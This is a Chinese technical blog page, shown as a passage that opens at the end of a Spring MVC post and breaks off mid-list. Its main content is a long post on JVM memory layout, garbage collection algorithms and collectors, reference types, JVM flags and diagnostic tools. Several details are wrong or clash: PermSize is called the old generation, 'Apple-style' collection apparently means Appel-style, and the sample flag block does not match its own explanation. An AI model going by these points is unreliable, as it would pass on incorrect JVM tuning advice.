<li><p>视图解析器解析视图：视图解析器根据 ModelAndView 中的视图名，将其解析成对应的视图对象，视图可以是一个 JSP 页面、一个 Thymeleaf 模板或者一个 HTML 片段等。</p>
</li>
<li><p>渲染视图：视图对象根据数据模型和视图模板，生成 HTML 内容，并将其返回给客户端。</p>
</li>
<li><p>返回响应：DispatcherServlet 将视图渲染的结果返回给客户端，客户端可以是一个浏览器、一个移动应用或者一个 API 调用。</p>
</li>
</ol>
<p>总之，SpringMVC 的工作流程涉及到多个组件之间的协作，其中 DispatcherServlet 负责接收请求和控制流程，HandlerMapping 负责查找处理器，HandlerAdapter 负责调用处理器，视图解析器负责解析视图，视图对象负责渲染视图，最终将响应返回给客户端。</p>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item">Posted&nbsp;<time dateTime="2023-05-03T01:21:36.000Z" title="2023/5/3 09:21:36">2023-05-03</time></span><span class="level-item">Updated&nbsp;<time dateTime="2023-05-10T10:14:12.783Z" title="2023/5/10 18:14:12">2023-05-10</time></span><span class="level-item">an hour read (About 10124 words)</span></div></div><p class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2023/05/03/JVM%E5%BA%95%E5%B1%82%E5%8E%9F%E7%90%86/">JVM底层原理</a></p><div class="content"><blockquote>
<p>JVM（Java Virtual Machine）用于运行Java字节码</p>
</blockquote>
<h1 id="JVM结构规范和执行流程"><a href="#JVM结构规范和执行流程" class="headerlink" title="JVM结构规范和执行流程"></a>JVM结构规范和执行流程</h1><h2 id="JVM的结构及其作用"><a href="#JVM的结构及其作用" class="headerlink" title="JVM的结构及其作用"></a>JVM的结构及其作用</h2><p>JVM 主要由以下部分组成：类加载器、运行时数据区、执行引擎和本地方法接口</p>
<ol>
<li><p>类加载器：类加载器负责将类文件（.class 文件）加载到 JVM 中，并生成对应的 Class 对象。类加载器是 JVM 的一个重要组成部分，它将类文件加载到 JVM 中，并根据需要进行链接、验证和初始化。类加载器按照类文件的位置、来源和访问权限等进行分类，通常分为三种类型：引导类加载器、扩展类加载器和应用程序类加载器。</p>
</li>
<li><p>运行时数据区：运行时数据区即 JVM 内存，存储JVM在运行过程中产生的数据，它由多个不同的数据区域组成，包括方法区、堆、虚拟机栈、本地方法栈和程序计数器等。</p>
<p>每个线程都有自己的虚拟机栈和本地方法栈，用于存储方法的参数、局部变量和返回值等信息。堆用于存储对象实例，方法区用于存储类信息、常量、静态变量和编译器生成的代码等。虚拟机栈用于管理Java方法的调用。而本地方法栈则用于管理native方法（例如Thread.start()）的调用</p>
</li>
<li><p>执行引擎：Execution Engine 是 JVM 的核心组件，它负责执行在 JVM 中加载的字节码指令。它包括解释器和即时编译器两种执行方式。此外还包含垃圾回收器，用于内存管理，可以自动释放不再使用的内存空间</p>
</li>
<li><p>本地方法接口：Native Method Interface 允许 Java 程序与底层的本地系统交互，例如调用 C&#x2F;C++ 等语言编写的库</p>
</li>
</ol>
<h2 id="HotSpot-JVM内存模型"><a href="#HotSpot-JVM内存模型" class="headerlink" title="HotSpot JVM内存模型"></a>HotSpot JVM内存模型</h2><p>HotSpot JVM的JVM结构（可以划分为三类）：</p>
<p>线程私有区域</p>
<ul>
<li><p>Java虚拟机栈</p>
<p>“栈内存”通常指的就是这里的Java虚拟机栈</p>
<p>线程内存模型（栈帧）：存储了局部变量表、操作数栈、动态链接、方法出口等信息</p>
<ol>
<li>局部变量表存储的信息<ol>
<li>基本数据类型：局部变量表存储了基本数据类型的值，包括 int、long、float、double、byte、short 和 char。</li>
<li>对象引用：局部变量表还存储了对象引用，即指向对象实例在Java堆中的指针。对于类实例和数组，这些引用通常是指向堆内存中的对象实例的指针。</li>
<li>returnAddress类型：returnAddress类型用于存储字节码指令的地址。当Java虚拟机执行到一个方法调用指令时，它会将下一条要执行的指令的地址保存到局部变量表。当方法执行完毕后，Java虚拟机通过局部变量表中保存的returnAddress返回到调用者的代码中继续执行。</li>
</ol>
</li>
<li>局部变量表的容量以局部变量槽（Local Variable Slot）为单位进行度量。一个局部变量槽可以存储一个32位的数据类型（如int、float、reference和returnAddress），而64位的数据类型（如long和double）则需要两个连续的局部变量槽来存储。</li>
</ol>
<p>处理动态链接方法的返回值和异常处理分派</p>
<p>记录了方法的执行过程</p>
</li>
<li><p>本地方法栈</p>
<p>本地方法栈和Java虚拟机栈唯一的不同是，本地方法栈存储的是Native方法的数据，Java虚拟机栈存储的是Java方法的数据</p>
</li>
<li><p>程序计数器</p>
<p>如果该线程执行的是Native方法，则程序计数器的值为空</p>
</li>
</ul>
<p>线程共享区域：</p>
<ul>
<li><p>Java堆</p>
<p>JVM运行过程中创建的对象几乎都会被存储在堆中。</p>
<p>是垃圾收集器管理的内存区域，又称“GC堆”。由于JVM采用分代回收算法，Java 堆从GC（Garbage Collection）的角度还可以细分为新生代（Eden、SurvivorTo、SurvivorFrom）、老年代</p>
</li>
<li><p>方法区（元空间）</p>
<p>常量、静态变量、即时编译器编译后的代码、类型信息缓存等数据</p>
</li>
</ul>
<p>直接内存</p>
<p>又称“堆外内存”，NIO（New Input&#x2F;Output）类引入了一种基于通道（Channel）和缓冲区（Buffer）的I&#x2F;O方式，可以使用Native函数库直接分配堆外内存，然后通过一个存储在Java堆里面的DirectByteBuffer对象作为这块内存的引用进行操作，避免在Java堆和Native堆中来回复制数据。</p>
<h2 id="JVM执行Java程序的流程"><a href="#JVM执行Java程序的流程" class="headerlink" title="JVM执行Java程序的流程"></a>JVM执行Java程序的流程</h2><p>运行一个Java程序时，JVM执行以下步骤：</p>
<ol>
<li><p>编译：首先，Java源代码（.java文件）需要被编译成字节码（.class文件）。编译过程由Java编译器（javac）完成。编译器会将Java源代码转换成与平台无关的字节码文件。</p>
</li>
<li><p>类加载阶段</p>
<ol>
<li><p>加载：在程序运行时，JVM负责加载字节码文件。这一过程由类加载器（ClassLoader）负责。类加载器首先查找并加载类文件，然后将字节码转换为JVM内部的数据结构。</p>
</li>
<li><p>验证：字节码文件加载后，JVM会对其进行验证，确保代码是安全和符合规范的。验证过程包括检查字节码的结构、数据类型、操作数栈等。若字节码不符合规范，JVM将拒绝执行。</p>
</li>
<li><p>准备：验证通过后，JVM为类中的静态变量分配内存并设置默认值。这一过程确保在初始化阶段为静态变量赋值时已有可用的内存。</p>
</li>
<li><p>解析：JVM对类的符号引用进行解析，将它们替换为实际的内存地址。这包括将类、字段、方法等的引用转换为具体的内存地址或偏移量。</p>
</li>
<li><p>初始化：在解析完成后，JVM执行类的初始化代码。这包括执行静态初始化块和为静态变量赋值。初始化阶段确保类在使用前已经被正确初始化。</p>
</li>
</ol>
</li>
<li><p>解释执行：JVM开始执行字节码。字节码由JVM的解释器逐条解释执行，或通过即时编译器（JIT）编译成本地代码后执行。JVM管理内存、线程、异常处理等，确保程序能够在一个独立的运行时环境中运行。</p>
</li>
<li><p>垃圾回收：在程序运行过程中，JVM负责管理内存。当对象不再被引用时，垃圾回收器（Garbage Collector）会自动回收其占用的内存，确保内存的有效利用。</p>
</li>
<li><p>结束：当程序执行完成或遇到异常时，JVM将执行结束操作。这包括释放内存、关闭资源、销毁线程等。最后，JVM退出并结束运行。</p>
</li>
</ol>
<h1 id="垃圾回收理论"><a href="#垃圾回收理论" class="headerlink" title="垃圾回收理论"></a>垃圾回收理论</h1><h2 id="判断一个对象是否存活的算法"><a href="#判断一个对象是否存活的算法" class="headerlink" title="判断一个对象是否存活的算法"></a>判断一个对象是否存活的算法</h2><ul>
<li>引用计数算法</li>
<li>可达性分析算法</li>
</ul>
<h2 id="分代回收理论"><a href="#分代回收理论" class="headerlink" title="分代回收理论"></a>分代回收理论</h2><p>分代收集理论建立在两个假说之上，分别是弱分代假说和强分代假说</p>
<p>根据对象的生命周期将内存分为新生代和老年代两个部分。优先回收新生代中的对象，减少全局垃圾回收的次数，提高效率。  回收效率高，不容易产生内存碎片。缺点是需要对内存进行分代管理，增加了复杂性。</p>
<h2 id="Apple式回收"><a href="#Apple式回收" class="headerlink" title="Apple式回收"></a>Apple式回收</h2><p>Apple式回收（基于分代收集理论和标记复制算法）：把新生代分为一块较大的Eden空间和两块较小的Survivor空间，每次分配内存只使用Eden和一块Survivor。发生垃圾收集时，将Eden和Survivor中仍然存活的对象一次性复制到另外一块Survivor空间上。然后直接清理掉Eden和已经使用过的那块Survivor。当存储存活对象的Survivor不足以容纳所有的存活对象，Apple式回收就使用其他内存区域（大多是老年代）进行分配担保。</p>
<h2 id="垃圾回收类型"><a href="#垃圾回收类型" class="headerlink" title="垃圾回收类型"></a>垃圾回收类型</h2><ul>
<li>部分收集<ul>
<li>新生代收集（Minor GC）</li>
<li>老年代收集（Major GC）</li>
</ul>
</li>
<li>整堆收集（Full GC）</li>
</ul>
<h2 id="垃圾回收算法"><a href="#垃圾回收算法" class="headerlink" title="垃圾回收算法"></a>垃圾回收算法</h2><p>判断对象是否“存活”的方法有引用计数算法和可达性分析法。</p>
<table>
<thead>
<tr>
<th>名称</th>
<th>时间</th>
<th>基本原理</th>
<th>优点</th>
<th>缺点</th>
<th>适用场景</th>
</tr>
</thead>
<tbody><tr>
<td>标记-清除算法</td>
<td>20世纪50年代</td>
<td>标记所有活动对象，然后清除所有未标记的对象。 也可以反过来。 是最基础的垃圾收集算法，后续的回收算法大都是以标记-清除算法为基础，对其缺点进行改进得到的。</td>
<td>简单易懂，可处理循环引用的情况。</td>
<td>效率不稳定，容易产生内存碎片。</td>
<td>由于，不需要内存移动，所以再内存回收时延迟低，关注延迟的CMS收集器则是基于标记-清除算法的，不过CMS收集器面临空间碎片过多时，会采用标记-整理算法清除一次。（用于老年代）</td>
</tr>
<tr>
<td>标记-复制算法</td>
<td>20世纪60年代</td>
<td>将内存分成已使用（From）和空闲（To）区域。在垃圾回收时，将存活的对象从 From 区域复制到 To 区域，然后清空 From 区域。现在的商业虚拟机都采用这种收集算法来回收新生代。</td>
<td>不容易产生内存碎片。</td>
<td>浪费一半内存空间。如果多数对象都是存活的，就会产生大量内存间的复制开销</td>
<td>由于，如果多数对象都是可回收的，需要复制的只是占少数的存活对象。所以适合新生代。现在的商用虚拟机大多优先采用这种算法回收新生代。（用于新生代）</td>
</tr>
<tr>
<td>标记-整理算法</td>
<td>20世纪60年代</td>
<td>其标记过程仍然和标记-清除算法一样，但后续步骤不是直接对可回收对象进行清理，而是让所有存活对象向内存空间的一端移动，然后直接清理掉边界外的内存。</td>
<td>不容易产生内存碎片。</td>
<td>需要移动对象，可能会造成较长的停顿时间。</td>
<td>由于，是否移动内存是优缺点并存的，移动则内存回收时会耗时，不移动则内存分配时会耗时。如果不移动内存，即使垃圾收集器的效率提高一些，则因为内存分配和访问比垃圾收集频率要高得多，这部分耗时增加，总的吞吐量仍然会下降。所以，关注吞吐量的Parallel Old是基于标记-整理算法的。（用于老年代）</td>
</tr>
</tbody></table>
<h2 id="HotSpot垃圾回收算法实现细节"><a href="#HotSpot垃圾回收算法实现细节" class="headerlink" title="HotSpot垃圾回收算法实现细节"></a>HotSpot垃圾回收算法实现细节</h2><p>根节点</p>
<p>安全点</p>
<p>并发可达性分析</p>
<h1 id="垃圾回收器"><a href="#垃圾回收器" class="headerlink" title="垃圾回收器"></a>垃圾回收器</h1><p>Java 的垃圾回收器有多种实现方式，每种垃圾回收器都有其独特的特点和适用场景。</p>
<h2 id="垃圾收集器下的并行和并发"><a href="#垃圾收集器下的并行和并发" class="headerlink" title="垃圾收集器下的并行和并发"></a>垃圾收集器下的并行和并发</h2><ul>
<li>并行：描述的是多条垃圾收集器线程之间的关系</li>
<li>并发：描述的是垃圾收集器和用户线程之间的关系</li>
</ul>
<h2 id="经典垃圾回收器"><a href="#经典垃圾回收器" class="headerlink" title="经典垃圾回收器"></a>经典垃圾回收器</h2><p>这里讨论的经典垃圾收集器是JDK7 Update4之后，JDK11正式发布之前，OracleJDK和HotSpot虚拟机所包含的全部可用的垃圾收集器。</p>
<h3 id="新生代垃圾回收器"><a href="#新生代垃圾回收器" class="headerlink" title="新生代垃圾回收器"></a>新生代垃圾回收器</h3><p>所有的新生代的垃圾回收器都是复制算法</p>
<table>
<thead>
<tr>
<th><strong>收集器</strong></th>
<th><strong>收集对象和算法</strong></th>
<th><strong>收集器类型</strong></th>
<th>优点</th>
<th>缺点</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>Serial</td>
<td>新生代，复制算法</td>
<td>单线程</td>
<td>所有收集器中内存消耗最小的</td>
<td>用户线程停顿时间长</td>
<td>单线程强调的是它在垃圾收集时，必须暂停其他所有工作线程，知道它收集完成。是HotSpot虚拟机运行在客户端模式下默认新生代收集器。适合处理器核心较少的环境。</td>
</tr>
<tr>
<td>ParNew</td>
<td>新生代，复制算法</td>
<td>并行的多线程收集器</td>
<td>只有ParNew能和CMS配合使用。有自适应的调节策略</td>
<td></td>
<td>实际上是Serial的多线程版本，除了同时使用多条线程进行垃圾收集外，其余都和Serial一样。默认开启和处理器核心数量相同的线程数，在目前服务器CPU往往达到32核核环境下，可以适用-XX:ParallelGCThreads参数来限制。</td>
</tr>
<tr>
<td>Parallel Scavenge</td>
<td>新生代，复制算法</td>
<td>并行的多线程收集器</td>
<td>吞吐量高</td>
<td></td>
<td>Parallel Scavenge的特点是它的关注点和其它收集器不同，Parallel Scavenge关注点是吞吐量，所谓吞吐量就是处理器用于运行用户代码的时间和处理器总消耗时间的比值。其合适的搭配是Parallel Old</td>
</tr>
</tbody></table>
<h3 id="老年代垃圾收集器"><a href="#老年代垃圾收集器" class="headerlink" title="老年代垃圾收集器"></a>老年代垃圾收集器</h3><p>老年代会有两种算法，标记整理算法 和 标记清除算法</p>
<table>
<thead>
<tr>
<th><strong>收集器</strong></th>
<th><strong>收集对象和算法</strong></th>
<th><strong>收集器类型</strong></th>
<th>优点</th>
<th>缺点</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>Serial Old</td>
<td>老年代，标记整理算法</td>
<td>单线程</td>
<td></td>
<td></td>
<td>是Serial的老年代版本</td>
</tr>
<tr>
<td>Parallel Old</td>
<td>老年代，标记整理算法</td>
<td>并行的多线程收集器</td>
<td></td>
<td></td>
<td>是Parallel Scavenge的老年代版本</td>
</tr>
<tr>
<td>CMS</td>
<td>老年代，标记清除算法</td>
<td>并行与并发收集器</td>
<td>是一种以获取最短用户线程停顿时间为目标的收集器，适合关注服务响应速度的场景</td>
<td>内存碎片：标记清除的回收方法会导致内存碎片，影响大对象分配。 CPU资源消耗：并发执行需占用额外CPU资源，可能影响总体性能。 浮动垃圾：无法处理并发标记阶段产生的新垃圾，可能导致内存浪费。 预测性能不稳定：基于触发条件，设置不合理时可能导致停顿时间过长。 长时间Full GC：某些情况下，CMS无法回收足够空间，触发Full GC，导致停顿。 实现复杂：相对其他收集器，CMS实现复杂，维护困难，可能出现错误或性能问题。</td>
<td>运作过程相对复杂，整个过程分为四步：初始标记、并发标记、重新标记、并发清除。</td>
</tr>
</tbody></table>
<h3 id="全功能垃圾收集器"><a href="#全功能垃圾收集器" class="headerlink" title="全功能垃圾收集器"></a>全功能垃圾收集器</h3><table>
<thead>
<tr>
<th><strong>收集器</strong></th>
<th><strong>收集对象和算法</strong></th>
<th><strong>收集器类型</strong></th>
<th>优点</th>
<th>缺点</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>G1</td>
<td>跨新生代和老年代；化整为零</td>
<td>并行与并发收集器</td>
<td>回收的最小单元不再是固定大小的新生代和老年代，而是Region，进而采用具有优先级的区域回收方式，保证了G1收集器在有限的时间内获取尽可能高的收集效率。</td>
<td></td>
<td>开创了面向局部收集的设计思路和基于Region的内存布局形式，不再以固定大小及固定数量的分代区域划分，而是把连续的Java堆划分为多个大小相等的独立区域（Region），每一杠Region根据需要，扮演新生代的Eden空间、Survior区间，或者老年代空间。并对不同角色的Region采用不同的策略去处理。Region中还有一类特殊的区域，Humongous，用来存储大对象。G1在大内存应用上表现好，CMS在小内存应用上表现优于G1。G1 垃圾收集器是 JDK 9 及其之后版本的默认垃圾收集器。</td>
</tr>
</tbody></table>
<h2 id="低延迟垃圾回收器"><a href="#低延迟垃圾回收器" class="headerlink" title="低延迟垃圾回收器"></a>低延迟垃圾回收器</h2><p>Shenandoah （<em>ˌʃɛnənˈdoʊə</em>）和ZGC两款垃圾收集器在几乎整个工作时间里都是并发的，而CMS和G1在回收新生代的垃圾时必须挂起用户线程。并且这两款垃圾收集器可以在任意可管理的堆容量下实现垃圾收集的停顿不超过十毫秒。</p>
<p>Shenandoah垃圾回收器是一款只有OpenJDK才会包含，而OracleJDK里不存在的收集器，Shenandoah和G1有着相似的堆内存布局，是基于G1开发的，并对G1的一些不足进行了改进</p>
<p>ZGC是一款基于Region内存布局的，使用了读屏障、染色体指针和内存多重映射等技术来实现可并发的标记-整理算法，以低延迟为首要目标的垃圾收集器</p>
<h2 id="不进行垃圾回收的垃圾收集器"><a href="#不进行垃圾回收的垃圾收集器" class="headerlink" title="不进行垃圾回收的垃圾收集器"></a>不进行垃圾回收的垃圾收集器</h2><p>Epsilon 垃圾回收器是一款以不进行垃圾回收的垃圾回收器，只复责分配和释放内存空间、与解释器协作、与编译器协作等简单的内存管理任务。</p>
<p>在实际生产环境中是有用武之地的，比如以下两种情景：</p>
<ol>
<li>如果应用只需要运行数分钟或数秒，只要Java虚拟机能正确的分配内存，在堆耗尽之前就会退出，那显然没有任何回收行为的Epsilon就很合适。</li>
<li>需要剥离垃圾回收器影响的性能测试和压力测试</li>
</ol>
<h2 id="Java引用类型和垃圾回收的关系"><a href="#Java引用类型和垃圾回收的关系" class="headerlink" title="Java引用类型和垃圾回收的关系"></a>Java引用类型和垃圾回收的关系</h2><p>在Java中，引用类型可以分为四种：强引用、软引用、弱引用和虚引用。它们主要在对象的生命周期和垃圾回收方面有所区别。</p>
<ol>
<li>强引用（Strong Reference）：<br>当一个对象被强引用指向时，它不会被垃圾回收器回收。只有当强引用不再指向该对象时，该对象才有可能被回收。</li>
</ol>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();<br></code></pre></td></tr></table></figure>

<ol start="2">
<li>软引用（Soft Reference）：<br>当一个对象只被软引用指向时，它在内存不足时会被垃圾回收器回收。软引用主要用于实现缓存功能。</li>
</ol>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.lang.ref.SoftReference;<br><span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>(); <span class="hljs-comment">// obj 是一个强引用</span><br>SoftReference&lt;Object&gt; softReference = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SoftReference</span>&lt;&gt;(obj); <span class="hljs-comment">// softReference 是一个软引用</span><br></code></pre></td></tr></table></figure>

<ol start="3">
<li>弱引用（Weak Reference）：<br>  当一个对象只被弱引用指向时，可以被垃圾回收器回收，而不考虑内存是否充足。弱引用主要用于实现弱映射（WeakHashMap）等数据结构，如ThreadLocal的实现就使用了弱引用。若是强引用，即使tl&#x3D;null ，但key的引用依然指向ThreadLocal对象，所以会有内存泄漏，而使用弱引用则不会。具体来说，<code>ThreadLocal</code>由一个名为<code>ThreadLocal.ThreadLocalMap</code>的内部类来保存。在<code>ThreadLocalMap</code>中，set到<code>ThreadLocal</code>对象的值作为值（value），<code>ThreadLocal</code>对象作为键（key），并且key是一个弱引用。这意味着，如果<code>ThreadLocal</code>对象没有其他强引用存在，那么这个<code>ThreadLocal</code>对象就可能在下一次垃圾回收时被回收。但还是有内存泄漏存在，ThreadLocal被回收，key的值变成null，则导致整个value再也无法被访问到，因此依然存在内存泄漏，所以还是需要remve()这个key。</li>
</ol>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.lang.ref.WeakReference;<br><span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();<br>WeakReference&lt;Object&gt; weakReference = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WeakReference</span>&lt;&gt;(obj);<br></code></pre></td></tr></table></figure>

<ol start="4">
<li>虚引用（Phantom Reference）：<br>当一个对象只被虚引用指向时，它只是用于跟踪对象是否被回收，可以被垃圾回收器回收。主要用于管理堆外内存，通常和ReferenceQueue结合使用，当DirectByteBuffer对象被回收时，就向ReferenceQueue对象中添加数据，垃圾回收器可以通过检测ReferenceQueue对象得到到这一变化，然后清理堆外内存。和弱引用的区别是弱引用中的对象可以被弱引用变量get到，但是虚引用引用的变量不能被get到。</li>
</ol>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.lang.ref.PhantomReference;<br><span class="hljs-keyword">import</span> java.lang.ref.ReferenceQueue;<br><span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();<br>ReferenceQueue&lt;Object&gt; referenceQueue = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReferenceQueue</span>&lt;&gt;();<br>PhantomReference&lt;Object&gt; phantomReference = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PhantomReference</span>&lt;&gt;(obj, referenceQueue);<br></code></pre></td></tr></table></figure>

<h1 id="JVM的参数配置"><a href="#JVM的参数配置" class="headerlink" title="JVM的参数配置"></a>JVM的参数配置</h1><h2 id="JVM的参数"><a href="#JVM的参数" class="headerlink" title="JVM的参数"></a>JVM的参数</h2><table>
<thead>
<tr>
<th>参数名</th>
<th>描述</th>
<th>使用示例</th>
</tr>
</thead>
<tbody><tr>
<td>-Xmx</td>
<td>设置JVM最大可用内存</td>
<td><code>java -Xmx2g MyApp</code> 将最大可用内存设置为2GB</td>
</tr>
<tr>
<td>-Xms</td>
<td>设置JVM最小可用内存</td>
<td><code>java -Xms512m MyApp</code> 将最小可用内存设置为512MB</td>
</tr>
<tr>
<td>-XX:MaxDirectMemorySize</td>
<td>设置JVM可以使用的最大堆外内存大小，其默认值等于JVM的最大堆大小（即<code>-Xmx</code>的值）</td>
<td><code>java -XX:MaxDirectMemorySize=1g -jar MyApp</code>设置JVM的最大堆外内存大小为1GB</td>
</tr>
<tr>
<td>-Xmn</td>
<td>指定了 JVM 中新生代的最大可用空间，它的默认值是整个堆空间的1&#x2F;4，即 <code>-Xmx</code> 的1&#x2F;4。当新生代的大小达到了 <code>-Xmn</code> 指定的大小后，如果新生代中仍然有存活的对象，它们将被晋升到老年代。</td>
<td><code>java -Xmn256m MyApp</code> 将新生代大小设置为256MB，</td>
</tr>
<tr>
<td>-XX:NewSize</td>
<td>设置新生代初始大小</td>
<td><code>java -XX:NewSize=256m Main</code>将新生代的大小设置为256MB</td>
</tr>
<tr>
<td>-XX:PermSize</td>
<td>设置老年代初始大小</td>
<td><code>java -XX:PermSize=128m MyApp</code> 将永久代初始大小设置为128MB</td>
</tr>
<tr>
<td>-XX:MaxPermSize</td>
<td>设置老年代最大大小</td>
<td><code>java -XX:MaxPermSize=256m MyApp</code> 将永久代最大大小设置为256MB</td>
</tr>
<tr>
<td>-XX:NewRatio</td>
<td>设置新生代和老年代的比例</td>
<td><code>java -XX:NewRatio=2 MyApp</code> 将新生代和老年代的比例设置为1:2</td>
</tr>
<tr>
<td>-XX:SurvivorRatio</td>
<td>设置新生代中eden区和survivor区的比例</td>
<td><code>java -XX:SurvivorRatio=8 MyApp</code> 将eden区和survivor区的比例设置为8:1</td>
</tr>
<tr>
<td>-XX:MetaspaceSize</td>
<td>设置元空间大小</td>
<td><code>java -XX:MetaspaceSize=256m MyApp</code> 将元空间大小设置为256MB</td>
</tr>
<tr>
<td>-XX:+UseG1GC</td>
<td>启用G1垃圾回收器</td>
<td><code>java -XX:+UseG1GC MyApp</code> 启用G1垃圾回收器</td>
</tr>
<tr>
<td>-XX:+UseConcMarkSweepGC</td>
<td>启用CMS垃圾回收器</td>
<td><code>java -XX:+UseConcMarkSweepGC MyApp</code> 启用CMS垃圾回收器</td>
</tr>
<tr>
<td>-XX:+HeapDumpOnOutOfMemoryError</td>
<td>当发生OOM异常时，自动生成堆转储文件（heap dump），以便在之后进行分析</td>
<td><code>java -XX:+HeapDumpOnOutOfMemoryError</code>当发生OOM异常时打印日志</td>
</tr>
<tr>
<td>-XX:HeapDumpPath&#x3D;path</td>
<td>指定生成堆转储文件的路径</td>
<td><code>-XX:HeapDumpPath=path=dump.log</code>指定OOM日志存储信息</td>
</tr>
<tr>
<td>-XX:+PrintGC</td>
<td>输出GC（垃圾回收）日志</td>
<td><code>-XX:+PrintGC</code></td>
</tr>
<tr>
<td>-XX:+PrintGCDetails</td>
<td>输出GC详细信息</td>
<td><code>-XX:+PrintGCDetails</code></td>
</tr>
<tr>
<td>-XX:+PrintHeapAtGC</td>
<td>在每次GC后打印堆的详细信息</td>
<td><code>-XX:+PrintHeapAtGC</code></td>
</tr>
</tbody></table>
<h2 id="JVM参数设置示例"><a href="#JVM参数设置示例" class="headerlink" title="JVM参数设置示例"></a>JVM参数设置示例</h2><p>8G内存服务器上运行了start.jar和Netty，JVM参数设置示例如下</p>
<p>其中2GB留给操作系统，其余6GB分配给应用程序</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell">java -server #JVM运行在服务器模式下<br>-XX:MaxDirectMemorySize #直接内存大小为2GB（Netty服务在运行时会使用直接内存，需要保证既有足够的直接内存满足Netty服务高效运行，又要在和虚拟机内存大小直接取得平衡）<br>-Xmx3g -Xms3g #Java堆的大小为3GB<br>--XX:NewSize #新生代占用堆1GB<br>-XX:MetaspaceSize=128m #元空间的大小为128MB<br>-XX:+UseG1GC #启用G1垃圾回收器<br>-XX:+HeapDumpOnOutOfMemoryError #发生OOM时打印日志<br>-XX:HeapDumpPath=path=dump.log #指定OOM日志存储信息<br>-XX:+PrintGCDetails #输出GC详细信息<br>-XX:+PrintHeapAtGC #每次GC后打印堆的详细信息<br></code></pre></td></tr></table></figure>

<p>参数的含义如下：</p>
<ul>
<li><code>-server</code>：JVM运行在服务器模式下，以优化长时间运行的性能。</li>
<li><code>-Xmx6g</code>：设置JVM的最大堆大小为6GB。这个值可以根据应用程序的需要进行调整。</li>
<li><code>-Xms6g</code>：设置JVM的初始堆大小为6GB。这个值应该与 <code>-Xmx</code> 相同，以避免堆大小的动态调整。</li>
<li><code>-Xmn3g</code>：设置JVM的新生代大小为3GB，这个值可以根据应用程序的内存需求和垃圾收集策略来进行调整。</li>
<li><code>-XX:MetaspaceSize=512m</code>：设置JVM的元数据空间的初始大小为512MB。</li>
<li><code>-XX:MaxMetaspaceSize=512m</code>：设置JVM的元数据空间的最大大小为512MB，这个值可以根据应用程序的需要进行调整。</li>
<li><code>-XX:+UseG1GC</code>：使用 G1 垃圾收集器。G1 垃圾收集器是 JDK 9 及其之后版本的默认垃圾收集器，它以可预测的停顿时间和高效的内存回收著称。</li>
</ul>
<p>这些参数的设置应该根据具体的应用程序和系统配置进行调整，以获得最佳性能和稳定性。另外，可以使用一些诊断工具，如 jstat 和 jmap 等来监测 JVM 的运行状态和内存使用情况，以帮助优化 JVM 的性能和稳定性</p>
<h2 id="JVM性能分析工具（调优工具）"><a href="#JVM性能分析工具（调优工具）" class="headerlink" title="JVM性能分析工具（调优工具）"></a>JVM性能分析工具（调优工具）</h2><p>常用的工具有jps、jinfo、jstat、jstack、jmap等，这些工具包含在JDK（Java Development Kit）的<code>bin</code>目录中，因此需要安装JDK才能使用</p>
<h3 id="jps"><a href="#jps" class="headerlink" title="jps"></a>jps</h3><p>用于查看正在运行的Java进程及其相关信息（进程id、虚拟机参数如端口号和可用内存大小、jar包名称）</p>
<p><code>jps</code>的基本语法如下：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">jps [options] [hostid]<br></code></pre></td></tr></table></figure>

<p><code>options</code>表示可选的参数，<code>hostid</code>表示远程主机的ID，如果不指定则默认为本地主机。以下是一些常用的<code>jps</code>选项：</p>
<ul>
<li><code>-l</code>：显示完整的包名和主类名。</li>
<li><code>-m</code>：显示传递给Java进程的参数。</li>
<li><code>-v</code>：显示传递给JVM的参数。</li>
<li><code>-q</code>：仅显示Java进程的ID，不显示类名、JAR名称和传递给Java进程的参数。</li>
</ul>
<h3 id="jinfo"><a href="#jinfo" class="headerlink" title="jinfo"></a>jinfo</h3><p><code>jinfo</code>（Java Configuration Info Tool）是一个Java命令行工具，用于获取Java虚拟机（JVM）进程的配置信息，如系统属性和JVM参数</p>
<p><code>jinfo</code>的基本语法如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">jinfo [option] pid<br></code></pre></td></tr></table></figure>

<ul>
